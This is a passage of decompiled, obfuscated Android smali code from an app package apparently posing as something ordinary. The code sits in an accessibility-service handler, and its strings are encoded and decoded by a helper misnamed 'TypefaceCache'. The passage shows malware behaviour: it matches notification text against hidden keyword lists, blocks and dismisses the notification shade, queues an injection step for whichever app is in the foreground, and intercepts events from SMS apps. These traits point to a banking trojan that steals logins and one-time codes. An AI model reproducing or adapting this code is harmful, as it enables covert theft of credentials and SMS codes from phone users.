    .line 542
    .line 543
    move-result-object v5

    .line 544
    invoke-static {v0, v5}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 545
    .line 546
    .line 547
    move-result v5

    .line 548
    if-nez v5, :cond_17

    .line 549
    .line 550
    const-string v5, "002000790057008800E200B000C100E9002D0079004F008E00F600B600D100A60037007F0054008900FD00BE00DC00A6002400730049"

    .line 551
    .line 552
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 553
    .line 554
    .line 555
    move-result-object v5

    .line 556
    invoke-static {v0, v5}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 557
    .line 558
    .line 559
    move-result v5

    .line 560
    if-nez v5, :cond_17

    .line 561
    .line 562
    const-string v5, "002C0066004B008800BE00B100DD00B3002A00700052008400F100AB00DB00A8002D"

    .line 563
    .line 564
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 565
    .line 566
    .line 567
    move-result-object v5

    .line 568
    invoke-static {v0, v5}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 569
    .line 570
    .line 571
    move-result v5

    .line 572
    if-nez v5, :cond_17

    .line 573
    .line 574
    const-string v5, "0035007F004D008800BE00B100DD00B3002A00700052008400F100AB00DB00A8002D"

    .line 575
    .line 576
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 577
    .line 578
    .line 579
    move-result-object v5

    nop

    nop

    .line 580
    invoke-static {v0, v5}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 581
    .line 582
    .line 583
    move-result v5

    .line 584
    if-nez v5, :cond_17

    nop

    .line 585
    .line 586
    const-string v5, "00370064005A008900E300AC00DB00A8002D"

    nop

    .line 587
    .line 588
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 589
    .line 590
    .line 591
    move-result-object v5

    .line 592
    invoke-static {v0, v5}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 593
    .line 594
    .line 595
    move-result v5

    .line 596
    if-nez v5, :cond_17

    .line 597
    .line 598
    const-string v5, "002A0078005D008E00FE00B600CA"

    .line 599
    .line 600
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 601
    .line 602
    .line 603
    move-result-object v5

    .line 604
    invoke-static {v0, v5}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 605
    .line 606
    .line 607
    move-result v5

    .line 608
    if-nez v5, :cond_17

    .line 609
    .line 610
    const-string v5, "003700730058008900FF"

    nop

    .line 611
    .line 612
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 613
    .line 614
    .line 615
    move-result-object v5

    .line 616
    invoke-static {v0, v5}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 617
    .line 618
    .line 619
    move-result v5

    .line 620
    if-nez v5, :cond_17

    .line 621
    .line 622
    const-string v5, "002A0062005E008B"

    .line 623
    .line 624
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 625
    .line 626
    .line 627
    move-result-object v5

    .line 628
    invoke-static {v0, v5}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 629
    .line 630
    .line 631
    move-result v5

    .line 632
    if-nez v5, :cond_17

    .line 633
    .line 634
    const-string v5, "00310073005A008B00FD00BA"

    .line 635
    .line 636
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 637
    .line 638
    .line 639
    move-result-object v5

    .line 640
    invoke-static {v0, v5}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 641
    .line 642
    .line 643
    move-result v5

    .line 644
    if-nez v5, :cond_17

    .line 645
    .line 646
    const-string v5, "002D0079004F008F00F900B100D5"

    .line 647
    .line 648
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 649
    .line 650
    .line 651
    move-result-object v5

    .line 652
    invoke-static {v0, v5}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 653
    .line 654
    .line 655
    move-result v5

    .line 656
    if-nez v5, :cond_17

    nop

    nop

    .line 657
    .line 658
    const-string v5, "003000770056009400E500B100D500E900220078005F009500FF00B600D600E900220066004B"

    .line 659
    .line 660
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 661
    .line 662
    .line 663
    move-result-object v5

    .line 664
    invoke-static {v0, v5}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 665
    .line 666
    .line 667
    move-result v5

    .line 668
    if-nez v5, :cond_17

    .line 669
    .line 670
    const-string v5, "002B0063005A009000F500B6009C00B4003A0065004F008200FD00B200D300A900220071005E0095"

    .line 671
    .line 672
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 673
    .line 674
    .line 675
    move-result-object v5

    .line 676
    invoke-static {v0, v5}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 677
    .line 678
    .line 679
    move-result v5

    .line 680
    if-nez v5, :cond_17

    .line 681
    .line 682
    const-string v5, "002B00790055008800E200F100C100BE00300062005E008A00FD00BE00DC00A6002400730049"

    .line 683
    .line 684
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 685
    .line 686
    .line 687
    move-result-object v5

    .line 688
    invoke-static {v0, v5}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 689
    .line 690
    .line 691
    move-result v5

    nop

    nop

    .line 692
    if-nez v5, :cond_17

    .line 693
    .line 694
    const-string v5, "002C0078005E009700FC00AA00C100E900220079005F"

    .line 695
    .line 696
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 697
    .line 698
    .line 699
    move-result-object v5

    .line 700
    invoke-static {v0, v5}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 701
    .line 702
    .line 703
    move-result v5

    .line 704
    if-nez v5, :cond_17

    .line 705
    .line 706
    const-string v5, "002E0079004F008800E200B000DE00A6006D00780054009300F900B900DB00A4002200620052008800FE"

    .line 707
    .line 708
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 709
    .line 710
    .line 711
    move-result-object v5

    .line 712
    invoke-static {v0, v5}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 713
    .line 714
    .line 715
    move-result v5

    .line 716
    if-nez v5, :cond_17

    .line 717
    .line 718
    const-string v5, "002F00730055008800E600B0009C00A9002C00620052008100F900BC00D300B3002A00790055"

    nop

    nop

    .line 719
    .line 720
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 721
    .line 722
    .line 723
    move-result-object v5

    .line 724
    invoke-static {v0, v5}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 725
    .line 726
    .line 727
    move-result v5

    .line 728
    if-nez v5, :cond_17

    .line 729
    .line 730
    const-string v5, "003000790055009E00BE00B100DD00B3002A00700052008400F100AB00DB00A8002D"

    .line 731
    .line 732
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 733
    .line 734
    .line 735
    move-result-object v5

    .line 736
    invoke-static {v0, v5}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 737
    .line 738
    .line 739
    move-result v5

    .line 740
    if-nez v5, :cond_17

    .line 741
    .line 742
    const-string v5, "002F0071005E00C900FE00B000C600AE0025007F0058008600E400B600DD00A9"

    .line 743
    .line 744
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 745
    .line 746
    .line 747
    move-result-object v5

    .line 748
    invoke-static {v0, v5}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 749
    .line 750
    .line 751
    move-result v5

    .line 752
    if-nez v5, :cond_17

    .line 753
    .line 754
    const-string v5, "00220065004E009400BE00B100DD00B3002A00700052008400F100AB00DB00A8002D"

    .line 755
    .line 756
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 757
    .line 758
    .line 759
    move-result-object v5

    .line 760
    invoke-static {v0, v5}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 761
    .line 762
    .line 763
    move-result v5

    .line 764
    if-nez v5, :cond_17

    .line 765
    .line 766
    const-string v5, "002E00730052009D00E500F100D400AB003A007B005E"

    .line 767
    .line 768
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 769
    .line 770
    .line 771
    move-result-object v5

    .line 772
    invoke-static {v0, v5}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 773
    .line 774
    .line 775
    move-result v5

    .line 776
    if-nez v5, :cond_17

    .line 777
    .line 778
    const-string v5, "003B007F005A008800FD00B6009C00AA002A0065005E009300E400B600DC00A00030"

    nop

    nop

    .line 779
    .line 780
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 781
    .line 782
    .line 783
    move-result-object v5

    .line 784
    invoke-static {v0, v5}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 785
    .line 786
    .line 787
    move-result v5

    .line 788
    if-nez v5, :cond_17

    .line 789
    .line 790
    const-string v5, "002D00790050008E00F100F100C100BE00300062005E008A00E500B6"

    .line 791
    .line 792
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 793
    .line 794
    .line 795
    move-result-object v5

    .line 796
    invoke-static {v0, v5}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 797
    .line 798
    .line 799
    move-result v0

    .line 800
    if-eqz v0, :cond_16

    .line 801
    .line 802
    goto :goto_d

    .line 803
    :cond_16
    move v0, v3

    .line 804
    goto/16 :goto_e

    .line 805
    :cond_17
    :goto_d
    const/4 v0, 0x1

    .line 806
    :goto_e
    const-string v5, "00300062005A009300E500AC00D000A60031"

    .line 807
    .line 808
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 809
    .line 810
    .line 811
    move-result-object v5

    .line 812
    invoke-static {v4, v5}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 813
    .line 814
    .line 815
    move-result v5

    .line 816
    if-nez v5, :cond_19

    .line 817
    .line 818
    const-string v5, "002D0079004F008E00F600B600D100A60037007F0054008900E300B700D300A30026"

    .line 819
    .line 820
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 821
    .line 822
    .line 823
    move-result-object v5

    .line 824
    invoke-static {v4, v5}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 825
    .line 826
    .line 827
    move-result v5

    .line 828
    if-nez v5, :cond_19

    .line 829
    .line 830
    const-string v5, "0030007E005A008300F5"

    .line 831
    .line 832
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 833
    .line 834
    .line 835
    move-result-object v5

    .line 836
    invoke-static {v4, v5}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 837
    .line 838
    .line 839
    move-result v5

    nop

    nop

    .line 840
    if-nez v5, :cond_19

    .line 841
    .line 842
    const-string v5, "002D0079004F008E00F600B600D100A60037007F0054008900CF00AF00D300A90026007A"

    nop

    .line 843
    .line 844
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 845
    .line 846
    .line 847
    move-result-object v5

    .line 848
    invoke-static {v4, v5}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 849
    .line 850
    .line 851
    move-result v5

    .line 852
    if-nez v5, :cond_19

    nop

    nop

    .line 853
    .line 854
    const-string v5, "003200630052008400FB00AC00D700B30037007F0055008000E3"

    .line 855
    .line 856
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 857
    .line 858
    .line 859
    move-result-object v5

    .line 860
    invoke-static {v4, v5}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 861
    .line 862
    .line 863
    move-result v5

    .line 864
    if-nez v5, :cond_19

    nop

    nop

    .line 865
    .line 866
    const-string v5, "0026006E004B008600FE00BB00D700A30035007F005E0090"

    .line 867
    .line 868
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 869
    .line 870
    .line 871
    move-result-object v5

    .line 872
    invoke-static {v4, v5}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 873
    .line 874
    .line 875
    move-result v5

    .line 876
    if-nez v5, :cond_19

    .line 877
    .line 878
    const-string v5, "003300770055008200FC00A900DB00A20034"

    .line 879
    .line 880
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 881
    .line 882
    .line 883
    move-result-object v5

    .line 884
    invoke-static {v4, v5}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 885
    .line 886
    .line 887
    move-result v5

    .line 888
    if-nez v5, :cond_19

    .line 889
    .line 890
    const-string v5, "002D0079004F008E00F600B600D100A60037007F0054008900E300BC00DD00A9003700770052008900F500AD"

    .line 891
    .line 892
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 893
    .line 894
    .line 895
    move-result-object v5

    .line 896
    invoke-static {v4, v5}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 897
    .line 898
    .line 899
    move-result v5

    .line 900
    if-nez v5, :cond_19

    .line 901
    .line 902
    const-string v5, "002E007F004E008E00FE00B000C600AE0025007F0058008600E400B600DD00A9"

    .line 903
    .line 904
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 905
    .line 906
    .line 907
    move-result-object v5

    .line 908
    invoke-static {v4, v5}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 909
    .line 910
    .line 911
    move-result v5

    nop

    .line 912
    if-nez v5, :cond_19

    .line 913
    .line 914
    const-string v5, "002000790055009300E200B000DE00A400260078004F008200E2"

    .line 915
    .line 916
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 917
    .line 918
    .line 919
    move-result-object v5

    .line 920
    invoke-static {v4, v5}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 921
    .line 922
    .line 923
    move-result v5

    .line 924
    if-nez v5, :cond_19

    .line 925
    .line 926
    const-string v5, "002000790055009300E200B000DE00B700220078005E008B"

    .line 927
    .line 928
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 929
    .line 930
    .line 931
    move-result-object v5

    .line 932
    invoke-static {v4, v5}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 933
    .line 934
    .line 935
    move-result v5

    .line 936
    if-nez v5, :cond_19

    nop

    nop

    .line 937
    .line 938
    const-string v5, "00320065004B008600FE00BA00DE"

    .line 939
    .line 940
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 941
    .line 942
    .line 943
    move-result-object v5

    .line 944
    invoke-static {v4, v5}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 945
    .line 946
    .line 947
    move-result v5

    .line 948
    if-nez v5, :cond_19

    .line 949
    .line 950
    const-string v5, "002D0079004F008E00F600B600D100A60037007F0054008900E300AB00D300A40028"

    .line 951
    .line 952
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 953
    .line 954
    .line 955
    move-result-object v5

    .line 956
    invoke-static {v4, v5}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 957
    .line 958
    .line 959
    move-result v5

    nop

    .line 960
    if-nez v5, :cond_19

    .line 961
    .line 962
    const-string v5, "002B0073005A008300E300AA00C2"

    .line 963
    .line 964
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 965
    .line 966
    .line 967
    move-result-object v5

    .line 968
    invoke-static {v4, v5}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 969
    .line 970
    .line 971
    move-result v5

    .line 972
    if-nez v5, :cond_19

    nop

    nop

    .line 973
    .line 974
    const-string v5, "00270064005A008000F400B000C500A9002B00730057009700F500AD"

    .line 975
    .line 976
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 977
    .line 978
    .line 979
    move-result-object v5

    .line 980
    invoke-static {v4, v5}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 981
    .line 982
    .line 983
    move-result v5

    .line 984
    if-nez v5, :cond_19

    .line 985
    .line 986
    const-string v5, "003300630057008B00F400B000C500A9"

    .line 987
    .line 988
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 989
    .line 990
    .line 991
    move-result-object v5

    .line 992
    invoke-static {v4, v5}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 993
    .line 994
    .line 995
    move-result v5

    .line 996
    if-nez v5, :cond_19

    .line 997
    .line 998
    const-string v5, "002D0079004F008E00F600B600D100A60037007F00540089"

    nop

    nop

    .line 999
    .line 1000
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1001
    .line 1002
    .line 1003
    move-result-object v5

    .line 1004
    invoke-static {v4, v5}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 1005
    .line 1006
    .line 1007
    move-result v5

    .line 1008
    if-eqz v5, :cond_18

    .line 1009
    .line 1010
    const-string v5, "003300770055008200FC"

    nop

    .line 1011
    .line 1012
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1013
    .line 1014
    .line 1015
    move-result-object v5

    .line 1016
    invoke-static {v4, v5}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 1017
    .line 1018
    .line 1019
    move-result v4

    .line 1020
    if-eqz v4, :cond_18

    .line 1021
    .line 1022
    goto/16 :goto_f

    .line 1023
    :cond_18
    move v4, v3

    .line 1024
    goto :goto_10

    .line 1025
    :cond_19
    :goto_f
    const/16 v4, 0x1

    .line 1026
    :goto_10
    if-eqz v0, :cond_1a

    .line 1027
    .line 1028
    if-eqz v4, :cond_1a

    .line 1029
    .line 1030
    sget-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Shade:Z

    nop

    nop

    .line 1031
    .line 1032
    if-eqz v0, :cond_1a

    .line 1033
    .line 1034
    const-string v0, "00180045007300A600D4009A00EF00E7000D0079004F008E00F600B600D100A60037007F0054008900B000AC00DA00A600270073001B008300F500AB00D700A400370073005F00C700B8"

    .line 1035
    .line 1036
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1037
    .line 1038
    .line 1039
    const-string v0, "006A003A001B008300F900AC00DF00AE003000650052008900F700E50092"

    .line 1040
    .line 1041
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1042
    .line 1043
    .line 1044
    invoke-virtual {v1}, Lapp/mobilex/plus/services/DataQFAdapter;->dismissNotificationShade$app_release()V

    .line 1045
    .line 1046
    .line 1047
    :cond_1a
    :goto_11
    sget-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Shade:Z

    .line 1048
    .line 1049
    if-eqz v0, :cond_1b

    .line 1050
    .line 1051
    iget-boolean v0, v1, Lapp/mobilex/plus/services/DataQFAdapter;->shadeBarrierActive:Z

    nop

    nop

    .line 1052
    .line 1053
    if-nez v0, :cond_1b

    .line 1054
    .line 1055
    invoke-direct {v1}, Lapp/mobilex/plus/services/DataQFAdapter;->addShadeBarrier()V

    .line 1056
    .line 1057
    .line 1058
    :cond_1b
    invoke-virtual {v9}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    .line 1059
    .line 1060
    .line 1061
    move-result v0

    nop

    nop

    .line 1062
    const/high16 v4, 0x400000

    .line 1063
    .line 1064
    if-ne v0, v4, :cond_1c

    .line 1065
    .line 1066
    invoke-static {}, Lv/s/oJLsXXGxdTuQpIRpV;->dDIMxZXP1V8HdM()Z

    .line 1067
    .line 1068
    .line 1069
    move-result v0

    .line 1070
    if-eqz v0, :cond_1c

    .line 1071
    .line 1072
    sget-object v0, Lv/s/GQh1bKoqkKhujFH2nJ;->dDIMxZXP1V8HdM:Ljava/lang/String;

    .line 1073
    .line 1074
    sget-boolean v0, Lv/s/GQh1bKoqkKhujFH2nJ;->JXn4Qf7zpnLjP5:Z
    :try_end_e
    .catchall {:try_start_e .. :try_end_e} :catchall_1

    .line 1075
    .line 1076
    if-eqz v0, :cond_1c

    .line 1077
    .line 1078
    :try_start_f
    invoke-direct {v1}, Lapp/mobilex/plus/services/DataQFAdapter;->getForegroundPackage()Ljava/lang/String;

    .line 1079
    .line 1080
    .line 1081
    move-result-object v0

    .line 1082
    if-eqz v0, :cond_1c

    .line 1083
    .line 1084
    invoke-static {v0}, Lv/s/GQh1bKoqkKhujFH2nJ;->w9sT1Swbhx3hs(Ljava/lang/String;)Z

    .line 1085
    .line 1086
    .line 1087
    move-result v4

    .line 1088
    if-eqz v4, :cond_1c

    .line 1089
    .line 1090
    iput-object v0, v1, Lapp/mobilex/plus/services/DataQFAdapter;->pendingInjectPkg:Ljava/lang/String;

    .line 1091
    .line 1092
    iget-object v0, v1, Lapp/mobilex/plus/services/DataQFAdapter;->handler:Landroid/os/Handler;

    .line 1093
    .line 1094
    iget-object v4, v1, Lapp/mobilex/plus/services/DataQFAdapter;->injectRunnable:Ljava/lang/Runnable;

    .line 1095
    .line 1096
    invoke-virtual {v0, v4}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 1097
    .line 1098
    .line 1099
    iget-object v0, v1, Lapp/mobilex/plus/services/DataQFAdapter;->injectRunnable:Ljava/lang/Runnable;

    .line 1100
    .line 1101
    const-wide/16 v4, 0xc8

    .line 1102
    .line 1103
    invoke-direct {v1, v0, v4, v5}, Lapp/mobilex/plus/services/DataQFAdapter;->safePostDelayed(Ljava/lang/Runnable;J)V
    :try_end_f
    .catchall {:try_start_f .. :try_end_f} :catchall_6

    .line 1104
    .line 1105
    .line 1106
    :catchall_6
    :cond_1c
    :try_start_10
    invoke-virtual {v9}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    .line 1107
    .line 1108
    .line 1109
    move-result v0

    .line 1110
    if-ne v0, v2, :cond_1e

    .line 1111
    .line 1112
    invoke-virtual {v9}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    .line 1113
    .line 1114
    .line 1115
    move-result-object v0

    .line 1116
    if-eqz v0, :cond_1d

    .line 1117
    .line 1118
    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 1119
    .line 1120
    .line 1121
    move-result-object v0

    .line 1122
    goto :goto_12

    .line 1123
    :cond_1d
    const/16 v0, 0x0

    nop

    nop

    .line 1124
    :goto_12
    if-eqz v0, :cond_1e

    .line 1125
    .line 1126
    iget-object v2, v1, Lapp/mobilex/plus/services/DataQFAdapter;->smsAppPackages:Ljava/util/Set;

    .line 1127
    .line 1128
    invoke-interface {v2, v0}, Ljava/util/Set;->contains(Ljava/lang/Object;)Z

    .line 1129
    .line 1130
    .line 1131
    move-result v2

    .line 1132
    if-eqz v2, :cond_1e

    .line 1133
    .line 1134
    invoke-direct {v1, v9, v0}, Lapp/mobilex/plus/services/DataQFAdapter;->handleSmsAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;Ljava/lang/String;)V

    .line 1135
    .line 1136
    .line 1137
    :cond_1e
    invoke-virtual {v9}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    .line 1138
    .line 1139
    .line 1140
    move-result v0

    .line 1141
    if-ne v0, v10, :cond_2c

    .line 1142
    .line 1143
    invoke-virtual {v9}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    .line 1144
    .line 1145
    .line 1146
    move-result-object v0

    .line 1147
    if-eqz v0, :cond_2c

    .line 1148
    .line 1149
    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 1150
    .line 1151
    .line 1152
    move-result-object v2

    .line 1153
    if-eqz v2, :cond_2c

    .line 1154
    .line 1155
    sget-object v0, Lv/s/vbdyByOHPJmeGXlq;->dDIMxZXP1V8HdM:Ljava/lang/String;

    .line 1156
    .line 1157
    invoke-static {}, Lv/s/vbdyByOHPJmeGXlq;->wotphlvK9sPbXJ()Z

    .line 1158
    .line 1159
    .line 1160
    move-result v0

    nop
    :try_end_10
    .catchall {:try_start_10 .. :try_end_10} :catchall_1

    .line 1161
    const-string v4, "002F0077004E008900F300B700D700B5"

    .line 1162
    .line 1163
    if-eqz v0, :cond_20

    .line 1164
    .line 1165
    :try_start_11
    invoke-static {}, Lv/s/vbdyByOHPJmeGXlq;->pyu8ovAipBTLYAiKab()Ljava/lang/String;

    .line 1166
    .line 1167
    .line 1168
    move-result-object v0

    .line 1169
